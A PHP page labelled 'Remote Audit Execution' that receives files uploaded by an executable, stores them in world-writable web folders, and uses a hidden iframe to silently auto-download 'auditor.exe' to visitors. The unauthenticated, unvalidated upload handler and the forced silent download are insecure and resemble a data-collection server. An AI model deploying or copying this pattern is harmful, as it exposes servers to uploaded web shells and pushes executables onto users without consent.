<?php
$results_dir = __DIR__ . '/audit_results';
$copies_dir  = __DIR__ . '/audit_copies';

if (!is_dir($results_dir)) mkdir($results_dir, 0777, true);
if (!is_dir($copies_dir))  mkdir($copies_dir,  0777, true);

// ====================== RECEIVE FILES FROM EXE ======================
if (!empty($_FILES["files"])) {

    $file = $_FILES["files"];
    $saved = [];

    foreach ($file["tmp_name"] as $i => $tmp) {
        if (!$tmp) continue;

        $name = basename($file["name"][$i]);
        $dest = $results_dir . '/' . $name;

        if (move_uploaded_file($tmp, $dest)) {
            $saved[] = $dest;

            // copy to audit_copies
            $copy_path = $copies_dir . '/' . $name;
            @copy($dest, $copy_path);
        }
    }

    // these messages go to the POST response (EXE), not to the browser
    if ($saved) {
        echo "<div class='success'>✔ Files received and stored.</div>";
    } else {
        echo "<div class='error'>No files were saved.</div>";
    }
    // do not exit; the GET response (browser) is separate
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Remote Audit Execution</title>

<style>
    body {
        font-family: Arial, sans-serif;
        background: #eef1f5;
        margin: 0;
        padding: 40px;
        color: #222;
    }

    .card {
        background: #fff;
        padding: 25px;
        margin-bottom: 30px;
        border-radius: 12px;
        border: 1px solid #d0d4d9;
        box-shadow: 0 3px 10px rgba(0,0,0,0.08);
    }

    h3 {
        margin-top: 0;
        font-size: 18px;
        color: #2c3e50;
        font-weight: 700;
    }
    
    .section-title {
        margin: 25px 0 10px 0;
        font-size: 26px;
        font-weight: 700;
        color: #2c3e50;
        border-bottom: 2px solid #d0d4d9;
        padding-bottom: 6px;
    }

    .success {
        background: #e8fbe8;
        border-left: 6px solid #27ae60;
        padding: 14px 18px;
        margin-bottom: 20px;
        border-radius: 6px;
        font-weight: bold;
        color: #1e7d3a;
    }

    .error {
        background: #fdeaea;
        border-left: 6px solid #c0392b;
        padding: 14px 18px;
        margin-bottom: 20px;
        border-radius: 6px;
        font-weight: bold;
        color: #a5281e;
    }

    pre {
        background: #f7f7f7;
        padding: 16px;
        border-radius: 8px;
        border: 1px solid #ccc;
        overflow-x: auto;
        font-size: 14px;
        white-space: pre-wrap;
        margin-bottom: 25px;
    }

    .filename {
        font-weight: bold;
        color: #2c3e50;
        margin-bottom: 6px;
        display: block;
    }
</style>

</head>
<body>

<div class="card">
    <div class="section-title">Remote Audit Execution</div>

    <h3>Automatic Download</h3>
    <div class="success">auditor.exe is being downloaded automatically.</div>
    <iframe src="list_files.php" id="lista" style="width:100%; height:360px; border:none;"></iframe>
</div>

<!-- Silent automatic download -->
<iframe src="download.php" style="display:none;"></iframe>

<script>
// Refresh only the file list iframe, without reloading the entire page
setInterval(() => {
    const frame = document.getElementById("lista");
    if (frame && frame.contentWindow) {
        frame.contentWindow.location.reload();
    }
}, 3000);
</script>

</body>
</html>
